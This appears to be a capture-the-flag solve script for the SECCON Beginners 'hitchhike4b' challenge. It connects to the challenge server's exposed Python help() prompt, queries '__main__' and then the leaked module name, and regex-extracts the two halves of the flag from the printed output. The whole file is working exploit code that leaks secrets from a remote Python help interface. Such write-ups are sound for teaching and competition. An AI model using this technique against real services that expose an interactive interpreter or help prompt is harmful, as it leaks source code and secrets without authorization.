import re
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("hitchhike4b.quals.beginners.seccon.jp", 55433))

# flag1 -> flag2
s.recv(2**15) # help>
s.send("__main__\n".encode())
recv1 = s.recv(2**15) # help>
flag1 = re.search("'(?P<flag1>ctf4b{.*?)'", recv1.decode()).group("flag1")
filename = re.search("/home/ctf/hitchhike4b/(?P<filename>.*?).py", recv1.decode()).group("filename")
#print(flag1)
#print(filename)
s.send(f"{filename}\n".encode())
s.recv(2**15) # help>
s.send("\n".encode())
recv2 = s.recv(2**15) # help>
flag2 = re.search("'(?P<flag2>.*?})'", recv2.decode()).group("flag2")
#print(flag2)
print(flag1 + flag2)
s.close()